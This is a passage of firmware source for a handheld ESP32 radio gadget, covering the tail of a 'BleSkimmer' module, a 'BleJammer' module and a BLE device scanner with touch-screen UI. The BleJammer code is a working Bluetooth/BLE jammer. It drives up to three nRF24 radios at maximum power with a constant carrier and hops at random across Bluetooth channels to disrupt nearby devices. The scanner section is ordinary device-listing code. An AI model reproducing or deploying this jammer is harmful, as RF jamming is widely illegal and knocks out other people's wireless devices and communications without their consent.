      } else {
        // Name/label changed on an existing row — repaint that row only.
        refreshDirtyRows();
      }
    }
  }

  // Live RSSI about once per second — only the dBm text, not the whole row.
  if (s_hitCount > 0 && (now - s_lastRssiMs >= 1000)) {
    s_lastRssiMs = now;
    const int per = rowsPerPage();
    const int start = s_page * per;
    for (int i = 0; i < per; i++) {
      const int absIndex = start + i;
      if (absIndex >= s_hitCount) {
        break;
      }
      paintRssiOnly(i, absIndex == s_selected);
    }
  }

  if (s_scanning && s_scan && !s_scan->isScanning()) {
    s_scan->start(0, nullptr, false);
  }

  static uint32_t s_lastLedMs = 0;
  if ((uint32_t)(now - s_lastLedMs) >= 200u) {
    if (s_scanning) {
      static uint8_t sweep = 0;
      sweep = (uint8_t)((sweep + 14) % 101);
      neopixelShowProgressColor(sweep, 150, 255, 0);
    } else {
      neopixelShowProgressColor(
          (uint8_t)constrain(s_hitCount * 100 / 12, 0, 100), 150, 255, 0);
    }
    s_lastLedMs = now;
  }

  if (feature_exit_requested) {
    teardown();
  }
}

void exit() {
  teardown();
}

}  // namespace BleSkimmer


namespace BleJammer {

RF24 radio1(CE_PIN_1, CSN_PIN_1, kNrfSpiHz);
RF24 radio2(CE_PIN_2, CSN_PIN_2, kNrfSpiHz);
RF24 radio3(CE_PIN_3, CSN_PIN_3, kNrfSpiHz);

enum OperationMode { BLE_MODULE, Bluetooth_MODULE };
OperationMode currentMode = BLE_MODULE;

bool jammerActive = false;
static bool radio3Active = false;
void updateTFT();

int bluetooth_channels[] = {32, 34, 46, 48, 50, 52, 0, 1, 2, 4, 6, 8, 22, 24, 26, 28, 30, 74, 76, 78, 80};
int ble_channels[] = {2, 26, 80};

const byte BLE_channels[] = {2, 26, 80};
byte channelGroup1[] = {2, 5, 8, 11};
byte channelGroup2[] = {26, 29, 32, 35};
byte channelGroup3[] = {80, 83, 86, 89};

#define SCREEN_HEIGHT 320
#define LINE_HEIGHT 12
#define MAX_LINES (SCREEN_HEIGHT / LINE_HEIGHT)

String Buffer[MAX_LINES];
uint16_t Buffercolor[MAX_LINES];
int Index = 0;

volatile bool modeChangeRequested = false;
volatile bool jammerToggleRequested = false;

unsigned long lastButtonPressTime = 0;
const unsigned long debounceDelay = 500;

static constexpr int JAMMER_LOG_TOP = 48;

static int jammerVisibleLines() {
  return bleMaxLinesInZone(JAMMER_LOG_TOP, LINE_HEIGHT);
}

static bool jammerLineFits(int yPos) {
  return yPos + LINE_HEIGHT <= bleContentBottom();
}

void scroll() {
  for (int i = 0; i < MAX_LINES - 1; i++) {
    Buffer[i] = Buffer[i + 1];
    Buffercolor[i] = Buffercolor[i + 1];
  }
}

void Print(String text, uint16_t color, bool extraSpace = false) {
  const int visibleLines = jammerVisibleLines();
  if (Index >= visibleLines) {
    for (int i = 0; i < visibleLines - 1; i++) {
      Buffer[i] = Buffer[i + 1];
      Buffercolor[i] = Buffercolor[i + 1];
    }
    Index = visibleLines - 1;
  }

  Buffer[Index] = text;
  Buffercolor[Index] = color;
  Index++;

  if (extraSpace && Index < visibleLines) {
    Buffer[Index] = "";
    Buffercolor[Index] = WHITE;
    Index++;
  }

  for (int i = 0; i < Index && i < visibleLines; i++) {
    int yPos = (i * LINE_HEIGHT) + JAMMER_LOG_TOP;
    if (!jammerLineFits(yPos)) {
      continue;
    }

    tft.fillRect(5, yPos, tft.width() - 10, LINE_HEIGHT, TFT_BLACK);

    tft.setTextColor(Buffercolor[i], TFT_BLACK);
    tft.setCursor(5, yPos);
    tft.print(Buffer[i]);
  }
}

void checkButtons() {
  unsigned long currentTime = millis();

  if (isButtonPressed(BTN_UP) && currentTime - lastButtonPressTime > debounceDelay) {
    jammerToggleRequested = true;
    lastButtonPressTime = currentTime;
  }

  if (isButtonPressed(BTN_RIGHT) && currentTime - lastButtonPressTime > debounceDelay) {
    modeChangeRequested = true;
    lastButtonPressTime = currentTime;
  }

  if (isButtonPressed(BTN_LEFT) && currentTime - lastButtonPressTime > debounceDelay) {
    modeChangeRequested = true;
    lastButtonPressTime = currentTime;
  }
}

void configureRadio(RF24 &radio, const byte* channels, size_t size) {

  radio.setAutoAck(false);
  radio.stopListening();
  radio.setRetries(0, 0);
  radio.setPALevel(RF24_PA_MAX, true);
  radio.setDataRate(RF24_2MBPS);
  radio.setCRCLength(RF24_CRC_DISABLED);
  radio.printPrettyDetails();
  radio.startConstCarrier(RF24_PA_MAX, 45);


  // for (size_t i = 0; i < size; i++) {
  //   radio.setChannel(channels[i]);
  //   radio.startConstCarrier(kNrfFixedPower, channels[i]);
  // }
}

void initializeRadiosMultiMode() {
  bool radio1Active = false;
  bool radio2Active = false;
  radio3Active = false;
  nrfApplyActiveRadioSelection();
  prepareNrfSharedSpiBus();

  if (beginNrfRadioReliable(radio1)) {
    radio1Active = true;
  }
  if (beginNrfRadioReliable(radio2)) {
    radio2Active = true;
  }
  if (thirdNrfEnabled() && beginNrfRadioReliable(radio3)) {
    radio3Active = true;
  }
  if (radio1Active) {
    configureRadio(radio1, channelGroup1, sizeof(channelGroup1));
  }
  if (radio2Active) {
    configureRadio(radio2, channelGroup2, sizeof(channelGroup2));
  }
  if (radio3Active) {
    configureRadio(radio3, channelGroup3, sizeof(channelGroup3));
  }
  Serial.printf("[nrf] BLE Jammer NRF1=%s NRF2=%s NRF3=%s fixed PA=MAX\n",
                radio1Active ? "OK" : "MISS", radio2Active ? "OK" : "MISS",
                radio3Active ? "OK" : (thirdNrfEnabled() ? "MISS" : "OFF"));
}

void initializeRadios() {
  if (jammerActive) {
    initializeRadiosMultiMode();

  } else {
    radio1.powerDown();
    radio2.powerDown();
    if (radio3Active) radio3.powerDown();
    radio3Active = false;
    nrfApplyActiveRadioSelection();
  }
}

void updateTFT() {
  static bool previousJammerState = false;
  static bool prevNRF1State = false;
  static bool prevNRF2State = false;
  static int previousMode = -1;

  const int bodyH = bleContentBottom() - 39;
  if (bodyH > 0) {
    tft.fillRect(0, 39, 240, bodyH, TFT_BLACK);
  }
  tft.fillRect(0, 19, 240, 16, DARK_GRAY);

  tft.setTextSize(1);

  struct ButtonGuide {
    const char* label;
    const unsigned char* icon;
  };

  ButtonGuide buttons[] = {
    {jammerActive ? "[ON]" : "[OFF]", bitmap_icon_UP},
    {"MODE-", bitmap_icon_LEFT},
    {"MODE+", bitmap_icon_RIGHT}
  };

  int xPos = 20;
  int yPosIcon = 19;
  int spacing = 75;

  for (int i = 0; i < 3; i++) {
    tft.drawBitmap(xPos, yPosIcon, buttons[i].icon, 16, 16, UI_ICON);

    tft.setTextColor(UI_TEXT, DARK_GRAY);
    tft.setCursor(xPos + 18, yPosIcon + 4);
    tft.print(buttons[i].label);

    if (i < 2) {
      int sepX = xPos + spacing - 8;
      tft.drawFastVLine(sepX, 22, 12, LIGHT_GRAY);
    }

    xPos += spacing;
  }

  tft.drawFastHLine(0, 19, 240, UI_LINE);
  tft.drawFastHLine(0, 35, 240, UI_LINE);
}

void checkModeChange() {
  checkButtons();

  if (modeChangeRequested) {
    modeChangeRequested = false;
    currentMode = static_cast<OperationMode>((currentMode + 1) % 2);
    initializeRadios();
    updateTFT();

    String modeText = "[+] Mode changed to: ";
    modeText += (currentMode == BLE_MODULE) ? "BLE" : "Bluetooth";
    Print(modeText, UI_TEXT, false);
  }

  if (jammerToggleRequested) {
    jammerToggleRequested = false;
    jammerActive = !jammerActive;
    initializeRadios();
    updateTFT();

    String jammerText = "[!] Jammer ";
    jammerText += (jammerActive) ? "Activated" : "Deactivated";
    Print(jammerText, UI_WARN, false);
  }
}

void blejamSetup() {
  pauseBackgroundRadioTasks();
  // Keep all decorative loads off while three nRF24 PAs are active.
  neopixelClear();
  setTouchButtonInputEnabled(true);
  bleSetJammerNavLabels();
  bleClearBody(TFT_BLACK);

  float currentBatteryVoltage = readBatteryVoltage();
  drawStatusBar(currentBatteryVoltage, true);
  redrawTouchButtonBar();

  initializeRadios();
  setupTouchscreen();
  updateTFT();

#if HAS_PCF8574_BUTTONS
  pcf.pinMode(BTN_UP, INPUT_PULLUP);
  pcf.pinMode(BTN_DOWN, INPUT_PULLUP);
  pcf.pinMode(BTN_LEFT, INPUT_PULLUP);
  pcf.pinMode(BTN_RIGHT, INPUT_PULLUP);
  pcf.pinMode(BTN_SELECT, INPUT_PULLUP);
#endif

  Print("[+] System Ready!", UI_WARN, true);
  redrawTouchButtonBar();
}

void blejamLoop() {

unsigned int chSel;
  while (1) {
    if (feature_active && isButtonPressed(BTN_SELECT)) {
      feature_exit_requested = true;
      return;
    }

    checkModeChange();

    if (jammerActive) {
      if (currentMode == BLE_MODULE) {
        chSel = bluetooth_channels[ random( sizeof(bluetooth_channels)/sizeof(bluetooth_channels[0]) ) ];
        radio1.setChannel(chSel);
        chSel = bluetooth_channels[ random( sizeof(bluetooth_channels)/sizeof(bluetooth_channels[0]) ) ];
        radio2.setChannel(chSel);
        delayMicroseconds(random(1,13));


      } else if (currentMode == Bluetooth_MODULE) {
        chSel = bluetooth_channels[ random( sizeof(bluetooth_channels)/sizeof(bluetooth_channels[0]) ) ];
        radio1.setChannel(chSel);
        chSel = bluetooth_channels[ random( sizeof(bluetooth_channels)/sizeof(bluetooth_channels[0]) ) ];
        radio2.setChannel(chSel);
        delayMicroseconds(random(1,13));
      }
    }
    // Yield to the scheduler so the idle task/watchdog and core-0 radio stack get
    // CPU time; without this the tight loop starves the system and everything lags.
  }
}

void exit() {

  jammerActive = false;
  initializeRadios();
  releaseSharedSpiWithoutSdMount();
}
}

namespace BleSniffer { void exit(); }

namespace BleScan {

#define SCREEN_WIDTH  240
#define SCREENHEIGHT 320
#define STATUS_BAR_Y_OFFSET 20
#define STATUS_BAR_HEIGHT 20
#define ICON_SIZE 16
#define ICON_NUM 2

BLEScan* bleScan;
BLEScanResults bleResults;
bool isScanning = false;
bool isDetailView = false;
int currentIndex = 0;
int listStartIndex = 0;
bool screenNeedsUpdate = true;
bool fullScreenUpdate = true;
static bool s_blePrevUp = false;
static bool s_blePrevDown = false;
static bool s_blePrevLeft = false;
static bool s_blePrevRight = false;
static bool s_blePrevSelect = false;

static constexpr int yshift = 30;

// Deauther-like list geometry (bigger rows + paging + bottom nav/tab bar).
static constexpr int LIST_HEADER_Y = 50;
static constexpr int LIST_FIRST_ROW_Y = LIST_HEADER_Y + 20;
static constexpr int LIST_ROW_H = 22;
static int current_page = 0;

static int bleListBottomY() {
  return featureHasTouchNavBar() ? touchNavContentBottomY() - 4 : 300;
}

static int bleDevicesPerPage() {
  return (bleListBottomY() - LIST_FIRST_ROW_Y) / LIST_ROW_H;
}

static void bleScanClearBody() {
  const int h = bleContentBottom() - 37;
  if (h > 0) {
    tft.fillRect(0, 37, 240, h, TFT_BLACK);
  }
}

static void bleScanUpdateNavLabels() {
  if (!featureHasTouchNavBar()) {
    return;
  }
  if (isDetailView) {
    setTouchNavLabels("Scan", "Next", "Exit", "Prev", "Back");
  } else {
    setTouchNavLabels("Scan", "Next", "Exit", "Prev", "View");
  }
  redrawTouchButtonBar();
}

unsigned long lastButtonPress = 0;
const unsigned long debounceTime = 200;

static bool uiDrawn = false;

static int iconX[ICON_NUM] = {220, 10};
static const unsigned char* icons[ICON_NUM] = {
  bitmap_icon_undo,
  bitmap_icon_go_back
};

static void drawButton(int x, int y, int w, int h, const char* label, bool highlight, bool disabled) {
  FeatureUI::ButtonStyle style = highlight ? FeatureUI::ButtonStyle::Primary
                                           : FeatureUI::ButtonStyle::Secondary;
  FeatureUI::drawButtonRect(x, y, w, h, label, style, false, disabled);
}

static void drawTabBar(const char* leftButton, bool leftDisabled,
                       const char* prevButton, bool prevDisabled,
                       const char* nextButton, bool nextDisabled) {
  if (featureHasTouchNavBar()) {
    bleScanUpdateNavLabels();
    return;
  }
  tft.fillRect(0, 304, SCREEN_WIDTH, 16, FEATURE_BG);
  if (leftButton && leftButton[0]) drawButton(0,   304, 57, 16, leftButton, false, leftDisabled);
  if (prevButton && prevButton[0]) drawButton(117, 304, 57, 16, prevButton, false, prevDisabled);
  if (nextButton && nextButton[0]) drawButton(177, 304, 57, 16, nextButton, false, nextDisabled);
}

static TaskHandle_t bgBleScanTaskHandle = nullptr;
static volatile bool bgHasResults = false;
static volatile uint32_t bgLastScanMs = 0;
static volatile bool bgBleScanRunning = false;
static volatile bool fgBleScanInProgress = false;
// Closes the small race between a feature asking the background scanner to
// stop and the worker evaluating its idle condition.  Without this gate the
// worker could begin a new blocking NimBLE scan while Wi-Fi/SD/SubGHz was
// already taking ownership of shared system resources.
static volatile bool bgBleScanPauseRequested = false;
static volatile bool bgBleScanPausedAck = true;
static const uint32_t BG_BLE_SCAN_INTERVAL_MS = 15000;
static bool bleInitDone = false;
static const uint32_t BG_BOOT_GRACE_MS = 6000;
static uint32_t bgBootMs = 0;
static volatile uint32_t bgResumeNotBeforeMs = 0;

static void bgBleWait(uint32_t waitMs) {
  // Wake immediately when a foreground feature requests ownership instead of
  // sleeping through the 15-second inter-scan interval.
  (void)ulTaskNotifyTake(pdTRUE, pdMS_TO_TICKS(waitMs));
}

static void stopBgBleScanIfRunning() {
  if (fgBleScanInProgress || !bleInitDone || !bleScan) return;
  if (!bgBleScanRunning) return;
  bleScan->stop();
}

static void ensureBleInit() {
  if (bleInitDone) return;
  if (!ensureBleStackReady()) return;

  bleScan = BLEDevice::getScan();
  bleScan->setActiveScan(true);
  // Leave almost the complete scan interval open so scan-response packets
  // (where many devices publish their local name) are not missed.
  bleScan->setInterval(100);
  bleScan->setWindow(99);
  bleInitDone = true;
}

static void bgBleScanTask(void* ) {
  ensureBleInit();
  for (;;) {
    const uint32_t now = millis();
    if (bgBootMs == 0) bgBootMs = now;

    const bool idleOk = (now - bgBootMs) > BG_BOOT_GRACE_MS &&
                        (int32_t)(now - bgResumeNotBeforeMs) >= 0;
    const bool allowed = settings().autoBleScan && idleOk && !feature_active &&
                         !in_sub_menu && !bgBleScanPauseRequested;
    if (allowed) {
      bgBleScanPausedAck = false;
      if (fgBleScanInProgress) {
        bgBleWait(250);
        continue;
      }
      if (bgBleScanPauseRequested || feature_active || in_sub_menu) {
        bgBleScanPausedAck = true;
        bgBleWait(1000);
        continue;
      }
      if (!autoScanTryClaimBle()) {
        bgBleScanPausedAck = true;
        bgBleWait(250);
        continue;
      }
      bgBleScanRunning = true;
      isScanning = true;
      bleResults = bleScan->start(2, false);
      isScanning = false;
      bgBleScanRunning = false;
      autoScanReleaseBle();
      if (bleResults.getCount() >= 0) {
        bgHasResults = (bleResults.getCount() > 0);
        bgLastScanMs = now;
      }
      bgBleWait(BG_BLE_SCAN_INTERVAL_MS);
    } else {
      if (bgBleScanRunning) {
        stopBgBleScanIfRunning();
      }
      if (!bgBleScanRunning) autoScanReleaseBle();
      bgBleScanPausedAck = true;
      bgBleWait(1000);
    }
  }
}

void displayScanning() {
  bleScanClearBody();
  tft.setTextSize(1);
  tft.setTextColor(GREEN);
  tft.setCursor(10, LIST_HEADER_Y);
  tft.println("Scanning.");

  loading(100, ORANGE, 0, 0, 3, true);
/*
  tft.setCursor(60, LIST_HEADER_Y);
  for (int i = 0; i < 2; i++) {
    for (int j = 0; j <= i; j++) {
      tft.print(".");
      delay(500);
    }
  }
*/
  tft.setCursor(10, LIST_HEADER_Y + 15);
  tft.println("Wait a moment.");
  delay(100);
  isScanning = false;
}

void startBLEScan() {
  pauseBackgroundRadioTasks();
  if (bgBleScanRunning) {
    stopBgBleScanIfRunning();
  }
  displayScanning();
  isDetailView = false;
  current_page = 0;
  currentIndex = 0;
  listStartIndex = 0;
  isScanning = true;
  screenNeedsUpdate = true;
  fullScreenUpdate = true;
  ensureBleInit();
  fgBleScanInProgress = true;
  bleResults = bleScan->start(5, false);
  fgBleScanInProgress = false;
  isScanning = false;
  screenNeedsUpdate = true;

  if (bleResults.getCount() >= 0) {
    bgHasResults = (bleResults.getCount() > 0);
    bgLastScanMs = millis();
  }
}

static void bleSelectCurrentDevice() {
  if (bleResults.getCount() <= 0 || isScanning) return;
  isDetailView = !isDetailView;
  screenNeedsUpdate = true;
  fullScreenUpdate = true;
  bleScanUpdateNavLabels();
}

static void bleMoveSelection(int delta) {
  const int count = bleResults.getCount();
  if (count <= 0 || isScanning || isDetailView) return;
  const int oldPage = current_page;
  currentIndex = constrain(currentIndex + delta, 0, count - 1);
  current_page = currentIndex / max(1, bleDevicesPerPage());
  listStartIndex = current_page * bleDevicesPerPage();
  fullScreenUpdate = (current_page != oldPage);
  screenNeedsUpdate = true;
}

void handleButtons() {
  const bool up = isPhysicalButtonPressed(BTN_UP);
  const bool down = isPhysicalButtonPressed(BTN_DOWN);
  const bool left = isPhysicalButtonPressed(BTN_LEFT);
  const bool right = isPhysicalButtonPressed(BTN_RIGHT);
  const bool select = isPhysicalButtonPressed(BTN_SELECT);

  if (up && !s_blePrevUp) {
    if (currentIndex > 0) {
      bleMoveSelection(-1);
    }
  }
  if (down && !s_blePrevDown) {
    if (currentIndex < bleResults.getCount() - 1) {
      bleMoveSelection(1);
    }
  }
  if (right && !s_blePrevRight) {
    bleSelectCurrentDevice();
  }
  if (left && !s_blePrevLeft) {
    if (isDetailView) {
      isDetailView = false;
      screenNeedsUpdate = true;
      fullScreenUpdate = true;
    } else if (!isScanning) {
      startBLEScan();
      fullScreenUpdate = true;
    }
  }
  if (select && !s_blePrevSelect) {
    bleSelectCurrentDevice();
  }

  s_blePrevUp = up;
  s_blePrevDown = down;
  s_blePrevLeft = left;
  s_blePrevRight = right;
  s_blePrevSelect = select;
}

static String bleFriendlyName(BLEAdvertisedDevice& device) {
  String name = device.getName().c_str();
  name.trim();
  if (name.length() > 0) return name;

  if (device.haveManufacturerData()) {
    std::string md = device.getManufacturerData();
    if (md.size() >= 2u) {
      const uint16_t company = (uint8_t)md[0] | ((uint16_t)(uint8_t)md[1] << 8);
      if (company == 0x004Cu) return "Apple BLE";
      if (company == 0x0075u) return "Samsung BLE";
      if (company == 0x0006u) return "Microsoft BLE";
      char companyName[20];
      snprintf(companyName, sizeof(companyName), "BLE company %04X", company);
      return String(companyName);
    }
  }
  if (device.haveServiceUUID()) {
    String uuid = device.getServiceUUID().toString().c_str();
    uuid.toLowerCase();
    if (uuid.indexOf("fe2c") >= 0) return "Google Fast Pair";
  }

  String address = device.getAddress().toString().c_str();
  return String("BLE ") + address.substring(max(0, (int)address.length() - 8));
}

void updateBLEList() {
  int deviceCount = bleResults.getCount();
  tft.setTextSize(1);

  if (deviceCount <= 0) {
    bleScanClearBody();
    tft.setTextColor(GREEN);
    tft.setCursor(10, LIST_HEADER_Y);
    tft.println("No devices found.");
    tft.setCursor(10, LIST_HEADER_Y + 12);
    tft.println("Press Rescan.");
    drawTabBar("Rescan", false, "Prev", true, "Next", true);
    return;
  }

  const int totalPages = (deviceCount + bleDevicesPerPage() - 1) / bleDevicesPerPage();
  if (current_page < 0) current_page = 0;
  if (current_page > totalPages - 1) current_page = max(0, totalPages - 1);
  listStartIndex = current_page * bleDevicesPerPage();

  static int last_rendered_page = -1;
  static int last_rendered_index = -1;

  auto drawRow = [&](int idx, bool selected) {
    if (idx < 0 || idx >= deviceCount) return;
    if (idx < listStartIndex || idx >= listStartIndex + bleDevicesPerPage()) return;
    const int row = idx - listStartIndex;
    const int y = LIST_FIRST_ROW_Y + row * LIST_ROW_H;

    // Clear only this row (avoid overlapping next row).
    tft.fillRect(0, y, SCREEN_WIDTH, LIST_ROW_H, TFT_BLACK);
    BLEAdvertisedDevice device = bleResults.getDevice(idx);
    String name = bleFriendlyName(device);
    if (name.length() > 22) name = name.substring(0, 22) + "...";

    tft.setCursor(10, y);
    tft.setTextColor(selected ? ORANGE : WHITE);
    tft.print(selected ? "> " : "  ");
    tft.println(name);
  };

  const bool pageChanged = (current_page != last_rendered_page);
  const bool needFull = fullScreenUpdate || pageChanged || (last_rendered_index < 0);

  if (needFull) {
    bleScanClearBody();
    tft.setTextColor(GREEN);
    tft.setCursor(10, LIST_HEADER_Y);
    tft.println("Devices:");

    char page_buf[20];
    snprintf(page_buf, sizeof(page_buf), "Page %d/%d", current_page + 1, totalPages);
    tft.setCursor(180, LIST_HEADER_Y);
    tft.setTextColor(GREEN);
    tft.println(page_buf);

    const int end_index = min(listStartIndex + bleDevicesPerPage(), deviceCount);
    for (int i = listStartIndex; i < end_index; i++) {
      drawRow(i, (i == currentIndex));
    }

    const bool prevDisabled = (current_page == 0);
    const bool nextDisabled = ((current_page + 1) * bleDevicesPerPage() >= deviceCount);
    drawTabBar("Rescan", false, "Prev", prevDisabled, "Next", nextDisabled);

    last_rendered_page = current_page;
    last_rendered_index = currentIndex;
    return;
  }

  if (last_rendered_index != currentIndex) {
    drawRow(last_rendered_index, false);
    drawRow(currentIndex, true);
    last_rendered_index = currentIndex;
  }
}

void displayBLEDetails() {

  bleScanClearBody();
  tft.setTextSize(1);

  const int deviceCount = bleResults.getCount();
  if (deviceCount <= 0) {
    isDetailView = false;
    screenNeedsUpdate = true;
    fullScreenUpdate = true;
    return;
  }
  if (currentIndex < 0) currentIndex = 0;
  if (currentIndex >= deviceCount) currentIndex = deviceCount - 1;

  BLEAdvertisedDevice device = bleResults.getDevice(currentIndex);
  String deviceName = bleFriendlyName(device);
  String address = device.getAddress().toString().c_str();
  int rssi = device.getRSSI();
  int txPower = device.getTXPower();

  tft.setTextColor(WHITE, TFT_BLACK);
  tft.setTextSize(1);

  int y = 50;
  tft.setCursor(10, y);
  tft.print("Device: " + deviceName);
  y += 20;
  tft.setCursor(10, y);
  tft.print("MAC: " + address);
  y += 20;
  tft.setCursor(10, y);
  tft.print("RSSI: " + String(rssi) + " dBm");
  y += 20;
  tft.setCursor(10, y);
  tft.print("Tx Power: " + String(txPower) + " dBm");

  if (device.haveServiceUUID()) {
    y += 20;
    tft.setCursor(10, y);
    tft.print("Service UUID: " + String(device.getServiceUUID().toString().c_str()));
  } else {
    y += 20;
    tft.setCursor(10, y);
    tft.print("No Service UUID");
  }
  if (device.haveManufacturerData()) {
    String manufacturerData = String((char*)device.getManufacturerData().c_str());
    y += 20;
    tft.setCursor(10, y);
    tft.print("Manufacturer: " + manufacturerData);
  } else {
    y += 20;
    tft.setCursor(10, y);
    tft.print("No Manufacturer Data");
  }
  if (device.haveServiceData()) {
    String serviceData = String((char*)device.getServiceData().c_str());
    y += 30;
    tft.setCursor(10, y);
    tft.print("Service Data: " + serviceData);
  } else {
    y += 30;
    tft.setCursor(10, y);
    tft.print("No Service Data");
  }

  drawTabBar("Rescan", false, "", true, "Back", false);
}

void runUI() {

  static int iconY = STATUS_BAR_Y_OFFSET;

  if (!uiDrawn) {
    tft.drawFastHLine(0, 19, 240, UI_LINE);
    tft.fillRect(0, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH, STATUS_BAR_HEIGHT, DARK_GRAY);

    for (int i = 0; i < ICON_NUM; i++) {
      if (icons[i] != NULL) {
        drawToolbarIcon(iconX[i], iconY, icons[i], TFT_WHITE);
      }
    }
    tft.drawFastHLine(0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, SCREEN_WIDTH, UI_LINE);
    uiDrawn = true;
  }

  static unsigned long lastAnimationTime = 0;
  static int animationState = 0;
  static int activeIcon = -1;

  if (animationState > 0 && millis() - lastAnimationTime >= TOOLBAR_ANIMATION_MS) {
    if (animationState == 1) {
      drawToolbarIcon(iconX[activeIcon], iconY, icons[activeIcon], TFT_WHITE);
      animationState = 2;

      switch (activeIcon) {
        case 0:
          if (!isScanning) {
            startBLEScan();
          }
          break;
        case 1:
           feature_exit_requested = true;
          break;
      }
    } else if (animationState == 2) {
      animationState = 0;
      activeIcon = -1;
    }
    lastAnimationTime = millis();
  }

  static unsigned long lastTouchCheck = 0;
  const unsigned long touchCheckInterval = 120;
  static uint32_t lastTouchActionMs = 0;

  if (millis() - lastTouchCheck >= touchCheckInterval) {
  int x, y;
  if (feature_active && readTouchXY(x, y)) {
      const uint32_t nowMs = millis();
      if (nowMs - lastTouchActionMs < 250) {
        lastTouchCheck = millis();
        return;
      }
      if (toolbarIconHitY(y, iconY)) {
        for (int i = 0; i < ICON_NUM; i++) {
          if (toolbarIconHitX(x, iconX[i])) {
            if (icons[i] != NULL && animationState == 0) {
              drawToolbarIcon(iconX[i], iconY, icons[i], TFT_BLACK);
              animationState = 1;
              activeIcon = i;
              lastAnimationTime = millis();
              lastTouchActionMs = nowMs;
            }
            break;
          }
        }
      } else if (!isScanning) {
        const int deviceCount = bleResults.getCount();

        if (!featureHasTouchNavBar() && y >= 290 && y <= 320) {
          const bool prevDisabled = (current_page == 0);
          const bool nextDisabled = ((current_page + 1) * bleDevicesPerPage() >= deviceCount);

          if (x >= 0 && x <= 57) {
            drawButton(0, 304, 57, 16, "Rescan", true, false);
            delay(50);
            startBLEScan();
            lastTouchActionMs = nowMs;
          } else if (x >= 117 && x <= 179 && !isDetailView && !prevDisabled) {
            drawButton(117, 304, 57, 16, "Prev", true, false);
            current_page--;
            if (current_page < 0) current_page = 0;
            currentIndex = current_page * bleDevicesPerPage();
            listStartIndex = current_page * bleDevicesPerPage();
            screenNeedsUpdate = true;
            fullScreenUpdate = true;
            lastTouchActionMs = nowMs;
          } else if (x >= 177 && x <= 240) {
            if (isDetailView) {
              drawButton(177, 304, 57, 16, "Back", true, false);
              isDetailView = false;
              screenNeedsUpdate = true;
              fullScreenUpdate = true;
              lastTouchActionMs = nowMs;
            } else if (!nextDisabled) {
              drawButton(177, 304, 57, 16, "Next", true, false);
              current_page++;
              currentIndex = current_page * bleDevicesPerPage();
              listStartIndex = current_page * bleDevicesPerPage();
              screenNeedsUpdate = true;
              fullScreenUpdate = true;
              lastTouchActionMs = nowMs;
            }
          }
        } else if (!isDetailView) {
          const int listMaxY = LIST_FIRST_ROW_Y + (bleDevicesPerPage() * LIST_ROW_H);
          if (deviceCount > 0 && y >= LIST_FIRST_ROW_Y && y < listMaxY) {
            const int row = (y - LIST_FIRST_ROW_Y) / LIST_ROW_H;
            const int idx = (current_page * bleDevicesPerPage()) + row;
            if (idx >= 0 && idx < deviceCount) {
              currentIndex = idx;
              isDetailView = true;
              screenNeedsUpdate = true;
              fullScreenUpdate = true;
              lastTouchActionMs = nowMs;
            }
          }
        }
      }
    }
    lastTouchCheck = millis();
  }
}

void bleScanSetup() {
  BleSniffer::exit();
  pauseBackgroundRadioTasks();
  setTouchButtonInputEnabled(true);
  bleScanUpdateNavLabels();
  bleClearBody(TFT_BLACK);

  float currentBatteryVoltage = readBatteryVoltage();
  drawStatusBar(currentBatteryVoltage, true);
  redrawTouchButtonBar();

  uiDrawn = false;
  runUI();

  setupTouchscreen();

#if HAS_PCF8574_BUTTONS
  pcf.pinMode(BTN_UP, INPUT_PULLUP);
  pcf.pinMode(BTN_DOWN, INPUT_PULLUP);
  pcf.pinMode(BTN_RIGHT, INPUT_PULLUP);
  pcf.pinMode(BTN_LEFT, INPUT_PULLUP);
  pcf.pinMode(BTN_SELECT, INPUT_PULLUP);
#endif

  // Synchronise edge state with the key that entered this feature.  A held
  // SELECT must not immediately open and then close the first result.
  s_blePrevUp = isPhysicalButtonPressed(BTN_UP);
  s_blePrevDown = isPhysicalButtonPressed(BTN_DOWN);
  s_blePrevLeft = isPhysicalButtonPressed(BTN_LEFT);
  s_blePrevRight = isPhysicalButtonPressed(BTN_RIGHT);
  s_blePrevSelect = isPhysicalButtonPressed(BTN_SELECT);

  ensureBleInit();

  // With auto BLE scan off, cached bleResults are not updated â€” only reuse when background scan is on.
  if (settings().autoBleScan && bgHasResults && bleResults.getCount() > 0) {
    current_page = 0;
    currentIndex = 0;
    listStartIndex = 0;
    isDetailView = false;
    screenNeedsUpdate = true;
    fullScreenUpdate = true;
    updateBLEList();
  } else {
    startBLEScan();
  }

  redrawTouchButtonBar();
}

void bleScanLoop() {
  if (isTouchNavButtonPressedEdge(BTN_SELECT)) {
    feature_exit_requested = true;
    return;
  }
  if (isTouchNavButtonPressedEdge(BTN_LEFT) && !isScanning) {
    startBLEScan();
  } else if (isTouchNavButtonPressedEdge(BTN_UP)) {
    bleMoveSelection(bleDevicesPerPage());
  } else if (isTouchNavButtonPressedEdge(BTN_DOWN)) {
    bleMoveSelection(-bleDevicesPerPage());
  } else if (isTouchNavButtonPressedEdge(BTN_RIGHT)) {
    bleSelectCurrentDevice();
  }

  tft.drawFastHLine(0, 19, 240, UI_LINE);
  handleButtons();

  runUI();
  updateStatusBar();

  static uint32_t s_lastLedMs = 0;
  const uint32_t ledNow = millis();
  if ((uint32_t)(ledNow - s_lastLedMs) >= 200u) {
    int n = bleResults.getCount();
    if (n < 0) n = 0;
    if (isScanning) {
      static uint8_t sweep = 0;
      sweep = (uint8_t)((sweep + 14) % 101);
      neopixelShowProgressColor(sweep, 255, 170, 0);
    } else {
      neopixelShowProgressColor((uint8_t)constrain(n * 100 / 12, 0, 100),
                                255, 170, 0);
    }
    s_lastLedMs = ledNow;
  }

  if (screenNeedsUpdate) {
    screenNeedsUpdate = false;
    if (isScanning) {
      displayScanning();
    } else if (!isDetailView) {
      updateBLEList();
    } else {
      displayBLEDetails();
    }
    if (fullScreenUpdate) fullScreenUpdate = false;
  }
}

void startBackgroundScanner() {
  // Keep the pause latched while a foreground feature owns radio/SPI/SD.
  // It is released explicitly when the main menu is displayed.
  if (bgBleScanPauseRequested) bgResumeNotBeforeMs = millis() + 4000u;
  bgBleScanPauseRequested = false;
  bgBleScanPausedAck = false;
  if (bgBleScanTaskHandle != nullptr) {
    xTaskNotifyGive(bgBleScanTaskHandle);
    return;
  }
  xTaskCreatePinnedToCore(
    bgBleScanTask,
    "bgBleScan",
    4096,
    nullptr,
    1,
    &bgBleScanTaskHandle,
    0
  );
}

void pauseBackgroundScanner() {
  bgBleScanPauseRequested = true;
